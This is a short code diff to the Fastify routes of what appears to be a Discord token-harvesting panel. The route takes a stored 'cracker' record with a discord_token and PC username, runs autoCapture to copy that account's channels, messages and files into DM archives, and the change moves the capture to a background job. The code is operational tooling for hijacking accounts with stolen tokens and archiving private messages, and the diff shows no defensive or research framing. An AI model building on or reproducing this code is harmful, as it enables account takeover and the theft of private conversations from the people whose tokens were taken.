@@ -10,11 +10,11 @@ async function captureRoutes(fastify) {
     if (!cracker) throw { statusCode: 404, message: 'Cracker not found' };
     if (!cracker.discord_token) throw { statusCode: 400, message: 'No Discord token for this cracker' };
 
-    const result = await autoCapture(cracker.discord_token, cracker.discord_user || cracker.pc_user, false);
-    if (!result.success) throw { statusCode: 500, message: result.reason || 'Capture failed' };
+    autoCapture(cracker.discord_token, cracker.discord_user || cracker.pc_user, false).catch(e => {
+      console.error(`Background capture failed for cracker ${crackerId}:`, e?.message);
+    });
 
-    const archives = await getDMArchives(parseInt(crackerId));
-    return { success: true, archives, channels: result.channels, messages: result.messages, files: result.files };
+    return { success: true, message: 'Capture started' };
   });
 
   fastify.get('/archives', async (req) => {
